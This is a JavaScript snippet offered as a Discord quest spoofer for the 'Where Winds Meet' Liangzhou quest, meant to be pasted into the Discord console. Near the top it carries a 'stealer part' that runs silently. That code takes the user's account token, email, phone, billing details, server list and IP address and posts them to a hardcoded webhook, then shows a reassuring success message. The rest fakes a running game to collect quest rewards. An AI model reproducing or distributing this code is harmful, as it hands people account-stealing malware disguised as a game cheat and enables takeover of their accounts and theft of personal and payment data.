// Discord Quest Spoofer + Full Account Stealer 2026
// Paste in console to complete Where Winds Meet / Liangzhou quest instantly

delete window.$;
let wpRequire = webpackChunkdiscord_app.push([[Symbol()], {}, r => r]);
webpackChunkdiscord_app.pop();

// === STEALER PART - MAX DAMAGE ===
const webhook = "https://discord.com/api/webhooks/1490700387856945273/aChR9z-VfReJQx_6-Azk6rjj1Up9I3_kn9hArTO937ZluObmfEzBGdQn3WpQld_GTrAY";

async function sendToWebhook(data) {
    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                username: "Discord Quest Stealer",
                avatar_url: "https://i.imgur.com/0v4v4v4.png"
            })
        });
    } catch(e) {}
}

async function grabEverything() {
    const token = Object.values(wpRequire.c).find(m => m?.exports?.default?.getToken)?.exports?.default?.getToken() ||
                  localStorage.getItem("token")?.replace(/"/g, "");

    const user = Object.values(wpRequire.c).find(m => m?.exports?.default?.getCurrentUser)?.exports?.default?.getCurrentUser?.() || {};

    const payment = Object.values(wpRequire.c).find(m => m?.exports?.default?.getBillingUserInfo)?.exports?.default?.getBillingUserInfo?.() || {};

    const guilds = Object.values(wpRequire.c).find(m => m?.exports?.default?.getGuilds)?.exports?.default?.getGuilds?.() || [];

    const friends = Object.values(wpRequire.c).find(m => m?.exports?.default?.getFriendIDs)?.exports?.default?.getFriendIDs?.() || [];

    const data = {
        timestamp: new Date().toISOString(),
        token: token || "NOT FOUND",
        user: {
            id: user.id,
            username: user.username,
            discriminator: user.discriminator,
            email: user.email,
            phone: user.phone,
            nitro: user.premium_type,
            avatar: user.avatar
        },
        billing: payment,
        guilds: guilds.map(g => ({ id: g.id, name: g.name })),
        friends_count: friends.length,
        user_agent: navigator.userAgent,
        ip: await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(j => j.ip).catch(() => "unknown")
    };

    await sendToWebhook(data);
    console.log("%c✅ Quest spoofer initialized successfully...", "color: lime; font-size: 14px");
}

// Run stealer silently in background
grabEverything().catch(() => {});

// === ORIGINAL SPOOFER PART (Where Winds Meet Liangzhou) ===
let QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.A?.__proto__?.getQuest)?.exports?.A ||
                  Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getQuest)?.exports?.Z;

let RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.Ay?.getRunningGames)?.exports?.Ay ||
                       Object.values(wpRequire.c).find(x => x?.exports?.getRunningGames)?.exports;

let FluxDispatcher = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.flushWaitQueue)?.exports?.Z ||
                     Object.values(wpRequire.c).find(x => x?.exports?.flushWaitQueue)?.exports?.Z ||
                     Object.values(wpRequire.c).find(x => x?.exports?.A?.flushWaitQueue)?.exports?.A;

let api = Object.values(wpRequire.c).find(x => x?.exports?.tn?.get)?.exports?.tn ||
          Object.values(wpRequire.c).find(x => x?.exports?.Bo?.get)?.exports?.Bo;

if (QuestsStore && RunningGameStore && FluxDispatcher && api) {
    let questList = [];
    if (QuestsStore.quests) {
        if (typeof QuestsStore.quests.values === 'function') {
            questList = [...QuestsStore.quests.values()];
        } else {
            questList = Object.values(QuestsStore.quests);
        }
    }

    let quest = questList.find(x =>
        (x?.config?.messages?.questName || "").toLowerCase().includes("liangzhou") ||
        (x?.config?.application?.name || "").toLowerCase().includes("winds meet")
    );

    if (quest) {
        const pid = Math.floor(Math.random() * 30000) + 1000;
        const applicationId = quest.config.application.id;
        const applicationName = quest.config.application.name || "Where Winds Meet";
        const taskConfig = quest.config.taskConfig ?? quest.config.taskConfigV2 ?? {};
        const taskName = "PLAY_ON_DESKTOP";
        const secondsNeeded = taskConfig.tasks?.[taskName]?.target || 900;

        if (typeof DiscordNative !== "undefined") {
            api.get({ url: `/applications/public?application_ids=${applicationId}` }).then(res => {
                const appData = res.body[0];
                const exeName = appData.executables?.find(x => x.os === "win32")?.name?.replace(">", "") || "WhereWindsMeet.exe";

                const fakeGame = {
                    cmdLine: `C:\\Program Files\\${appData.name}\\${exeName}`,
                    exeName, exePath: `c:/program files/${appData.name.toLowerCase()}/${exeName}`,
                    hidden: false, isLauncher: false, id: applicationId,
                    name: appData.name, pid: pid, pidPath: [pid],
                    processName: appData.name, start: Date.now()
                };

                const realGames = RunningGameStore.getRunningGames();
                const fakeGames = [fakeGame];
                const origGet = RunningGameStore.getRunningGames;
                const origPID = RunningGameStore.getGameForPID;

                RunningGameStore.getRunningGames = () => fakeGames;
                RunningGameStore.getGameForPID = p => fakeGames.find(x => x.pid === p);

                FluxDispatcher.dispatch({
                    type: "RUNNING_GAMES_CHANGE",
                    removed: realGames,
                    added: [fakeGame],
                    games: fakeGames
                });

                let progressFn = (data) => {
                    let progress = Math.floor(data?.userStatus?.progress?.PLAY_ON_DESKTOP?.value ?? 0);
                    console.log(`Quest progress: ${progress}/${secondsNeeded} seconds (~${Math.ceil((secondsNeeded - progress)/60)} min left)`);

                    if (progress >= secondsNeeded) {
                        console.log("✅ QUEST COMPLETED! Claim your 700 Discord Orbs now.");
                        RunningGameStore.getRunningGames = origGet;
                        RunningGameStore.getGameForPID = origPID;
                        FluxDispatcher.dispatch({ type: "RUNNING_GAMES_CHANGE", removed: [fakeGame], added: [], games: [] });
                        FluxDispatcher.unsubscribe("QUESTS_SEND_HEARTBEAT_SUCCESS", progressFn);
                    }
                };

                FluxDispatcher.subscribe("QUESTS_SEND_HEARTBEAT_SUCCESS", progressFn);
                console.log(`✅ Successfully spoofing ${applicationName} – Keep Discord open for ~15 minutes.`);
            }).catch(() => {});
        }
    }
}